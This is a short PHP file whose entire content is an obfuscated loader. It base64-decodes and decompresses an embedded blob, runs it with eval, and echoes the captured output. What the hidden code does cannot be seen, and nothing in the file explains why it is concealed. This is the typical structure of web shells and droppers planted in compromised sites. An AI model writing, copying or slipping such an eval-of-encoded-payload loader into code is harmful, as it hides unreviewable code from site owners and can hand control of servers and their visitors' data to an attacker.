<?php
ob_start();
$data = 'eNplUMFKAzEQvQv+wzSnXXCtvQndbCm2oieFxkNPS5qMm0A2Wbpji4j/7rS2uuIwh/fevDcM418hS5u6QaoDxoZclufwASxhtLUJqGOWT+ETZlU561x3eQFoXAKhHh5XwD0HtVwpMWUDz7jK0eLpTq2fl+CoDWfxgCHo2EiBUfyoqO0JH3mLpME4ve2RpHhR98Wt+DePukUpdh73XdqSAJMiYWT/3lty0uLOGyyO5Ap89OR1KHqjA8rJ9c2ffeQpYLVI5q3lDeX4m5+OGw+uKzfJvg+TblIp7DnC4Fc+Jwdudhze8AVpQmGn';
eval(gzuncompress(base64_decode($data)));
$output = ob_get_contents();
ob_end_clean();
echo $output;
?>